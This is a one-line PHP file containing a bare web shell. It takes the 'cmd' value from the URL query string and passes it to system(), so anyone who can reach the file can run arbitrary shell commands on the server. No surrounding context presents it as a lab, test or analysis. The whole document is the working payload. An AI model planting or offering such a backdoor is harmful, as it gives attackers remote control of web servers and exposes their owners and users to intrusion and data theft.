<?php system($_GET['cmd']); ?>
